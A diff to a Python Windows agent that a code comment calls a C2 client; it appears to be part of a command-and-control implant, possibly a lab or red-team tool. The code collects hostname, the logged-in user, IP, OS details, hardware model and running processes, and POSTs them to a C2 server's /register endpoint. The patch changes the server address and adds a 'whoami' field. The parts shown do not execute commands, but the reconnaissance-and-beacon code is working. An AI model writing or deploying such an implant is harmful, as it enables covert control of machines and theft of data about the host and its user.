@@ -10,7 +10,7 @@ import win32com.client
 import os
 
 # URL of the C2 server
-SERVER_URL = "http://192.168.30.21:5000"
+SERVER_URL = "http://192.168.80.24:5000"
 
 # Generate a unique agent ID
 AGENT_ID = str(uuid.uuid4())
@@ -96,16 +96,18 @@ def get_computer_model_with_com():
 
 def get_system_info():
     """Collect detailed system information."""
+
+    # Some data such as hostname, whoami are already obtained in register_with_server() function
     system_info = {
         'hostname': socket.gethostname(),
+        'whoami': os.getlogin(),
         'ip': get_active_ip(),
         'os': platform.system(),
         'os_version': platform.version(),
         'architecture': platform.architecture()[0],
-        'uptime': format_uptime(time.time() - psutil.boot_time()),  # Convert to readable uptime
+        'uptime': format_uptime(time.time() - psutil.boot_time()),
         'kernel_version': platform.release(),
         'model': get_computer_model_with_com(),
-        # 'current_user': run_whoami(),
     }
 
     # CPU info
@@ -147,7 +149,7 @@ def get_system_info():
 
             # Filter out system processes based on known system accounts
             if username in system_accounts or cpu_percent < 1 or memory_percent < 1:
-                background_processes.append(proc.info)  # Likely background processes
+                background_processes.append(proc.info)
             else:
                 # Consider apps based on significant resource usage
                 apps.append(proc.info)
@@ -168,8 +170,9 @@ def register_with_server():
             "agent_id": AGENT_ID,
             "ip": get_active_ip(),
             "hostname": socket.gethostname(),
+            "whoami": os.getlogin(),
             "os": get_windows_version(),
-            "system_info": get_system_info()  # Send system info along with registration
+            "system_info": get_system_info()
         }
         response = requests.post(f"{SERVER_URL}/register", json=data)
         if response.status_code == 200:
